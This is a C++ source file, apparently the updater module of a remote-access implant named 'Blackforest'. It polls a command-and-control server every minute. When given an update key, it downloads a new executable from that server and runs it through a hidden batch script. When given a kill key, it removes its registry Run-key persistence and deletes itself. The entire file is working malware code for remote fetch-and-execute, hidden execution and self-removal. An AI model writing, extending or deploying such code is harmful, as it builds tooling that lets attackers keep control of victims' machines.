#include "core/maintenance/updater.hpp"
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <fstream>
#include <sstream>
#include <winreg.h> // Added for registry operations

#pragma comment(lib, "urlmon.lib")

void Updater::Start(const std::string& c2_ip, int port, const std::string& updateKey, const std::string& killKey) {
    std::string baseUrl = "http://" + c2_ip + ":" + std::to_string(port) + "/";
    std::string checkUrl = baseUrl + "update.txt";
    std::string exeUrl = baseUrl + "Blackforest.exe";
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string checkFile = std::string(tempPath) + "update_check.txt";
    std::string newExe = std::string(tempPath) + "new_agent.exe";
    std::string batFile = std::string(tempPath) + "update.bat";

    while(true) {
        Sleep(60000); // Check every 60 seconds

        // 1. Download Command File
        // Delete cache to ensure fresh download
        DeleteUrlCacheEntryA(checkUrl.c_str());
        HRESULT hr = URLDownloadToFileA(NULL, checkUrl.c_str(), checkFile.c_str(), 0, NULL);
        
        if(hr == S_OK) {
            // 2. Read Content
            std::ifstream f(checkFile);
            std::string content;
            if(f.good()) {
                std::getline(f, content);
            }
            f.close();
            DeleteFileA(checkFile.c_str()); // Cleanup

            // 3. Verify Key
            // Trim whitespace
            content.erase(content.find_last_not_of(" \n\r\t")+1);

            // --- KILL SWITCH ---
            if(content == killKey) {
                // Remove Persistence
                HKEY hKey;
                if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                    RegDeleteValueA(hKey, "BlackforestUpdater");
                    RegCloseKey(hKey);
                }

                // Get Our Path
                char currentPath[MAX_PATH];
                GetModuleFileNameA(NULL, currentPath, MAX_PATH);

                // Suicide Script
                std::string killBat = std::string(tempPath) + "kill.bat";
                std::ofstream bat(killBat);
                bat << "@echo off\n";
                bat << "timeout /t 5 /nobreak > NUL\n";
                bat << "del /f /q \"" << currentPath << "\"\n";
                // Optionally remove directory if empty?
                bat << "del \"%~f0\" & exit\n";
                bat.close();

                ShellExecuteA(NULL, "open", killBat.c_str(), NULL, NULL, SW_HIDE);
                exit(0);
            }
            
            // --- UPDATE ---
            if(content == updateKey) {
                // 4. Trigger Update
                // Download new Exe to temp
                DeleteUrlCacheEntryA(exeUrl.c_str());
                if(URLDownloadToFileA(NULL, exeUrl.c_str(), newExe.c_str(), 0, NULL) == S_OK) {
                    
                    // Get Current Path
                    char currentPath[MAX_PATH];
                    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

                    // Compare Files (Simple Size Check & Header Check)
                    WIN32_FILE_ATTRIBUTE_DATA curInfo, newInfo;
                    if(GetFileAttributesExA(currentPath, GetFileExInfoStandard, &curInfo) &&
                       GetFileAttributesExA(newExe.c_str(), GetFileExInfoStandard, &newInfo)) {
                        
                        // If sizes are identical, assume it's the same version to prevent loop
                        // (Ideally we would hash, but size + modification time difference is usually enough for this context)
                        if(curInfo.nFileSizeLow == newInfo.nFileSizeLow) {
                             DeleteFileA(newExe.c_str());
                             continue; // Skip update
                        }
                    }

                    // Create Batch Script for replacement
                    std::ofstream bat(batFile);
                    bat << "@echo off\n";
                    bat << "timeout /t 5 /nobreak > NUL\n"; // Wait for us to exit
                    bat << "move /y \"" << newExe << "\" \"" << currentPath << "\"\n";
                    bat << "start \"\" \"" << currentPath << "\"\n";
                    bat << "del \"%~f0\" & exit\n";
                    bat.close();

                    // Execute Batch
                    ShellExecuteA(NULL, "open", batFile.c_str(), NULL, NULL, SW_HIDE);
                    
                    // Die
                    exit(0);
                }
            }
        }
    }
}
